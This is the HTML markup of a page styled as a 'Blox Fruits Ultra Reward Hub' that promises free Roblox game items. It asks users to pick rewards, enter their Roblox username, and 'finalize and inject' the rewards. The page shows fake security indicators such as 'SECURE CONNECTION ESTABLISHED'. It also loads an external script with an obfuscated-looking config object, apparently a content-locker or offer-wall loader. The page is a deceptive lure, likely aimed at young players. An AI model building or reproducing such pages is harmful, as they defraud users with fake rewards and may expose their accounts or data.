<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blox Fruits | Ultra Reward Hub</title>
    <script type="text/javascript">
        var AncoY_reQ_shZzBc={"it":4586440,"key":"a355c"};
    </script>
    <script src="https://duw03nk63ml3f.cloudfront.net/f1e1db2.js"></script>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;800&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
</head>
<body>

    <div class="main-wrapper">
        <header class="app-header">
            <img src="images/logo.png" alt="Logo" class="main-logo">
            <div class="system-status"><span class="dot"></span> SECURE CONNECTION ESTABLISHED</div>
        </header>

        <section class="selection-area">
            <div class="step-indicator">STEP 1: SELECT 3 UNIQUE REWARDS</div>
            <div class="slots-wrapper">
                <div class="neon-slot" id="slot-0"></div>
                <div class="neon-slot" id="slot-1"></div>
                <div class="neon-slot" id="slot-2"></div>
            </div>
            <button id="init-btn" class="btn-main disabled" disabled>INITIALIZE TRANSFER</button>
        </section>

        <div class="rewards-grid" id="grid"></div>
    </div>

    <div id="modal-auth" class="modal-overlay" style="display: none;">
        <div class="terminal-container">
            <div class="scanner-line"></div>
            <h3>AUTHENTICATION REQUIRED</h3>
            <div class="input-group">
                <input type="text" id="rbx-user" placeholder="Enter Roblox Identifier..." autocomplete="off">
                <label>USER ID</label>
                <div class="glow-border"></div>
            </div>
            <div id="err-text" class="error-msg" style="display: none;">USER NOT FOUND / INVALID INPUT</div>
            <div class="modal-footer">
                <button class="btn-secondary" onclick="closeAuth()">ABORT</button>
                <button class="btn-primary" id="sync-btn">SYNC DATA</button>
            </div>
        </div>
    </div>

    <div id="modal-profile" class="modal-overlay" style="display: none;">
        <div class="profile-card">
            <div class="pfp-ring"><img id="avatar-img" src=""></div>
            <h2 id="disp-name">---</h2>
            <div class="stats-row">
                <div class="stat-item">Followers<span id="f-count">0</span></div>
                <div class="stat-item">Following<span id="f-ing">0</span></div>
            </div>
            <div class="activity-tag">STATUS: <span id="p-status">ACTIVE</span></div>
            <button id="final-claim" class="btn-main-full">FINALIZE & INJECT REWARDS</button>
        </div>
    </div>

    <audio id="snd-tap" src="media/tap.mp3"></audio>
    <audio id="snd-select" src="media/selection.mp3"></audio>
    <audio id="snd-error" src="media/error.mp3"></audio>

    <script src="script.js"></script>
</body>
</html>
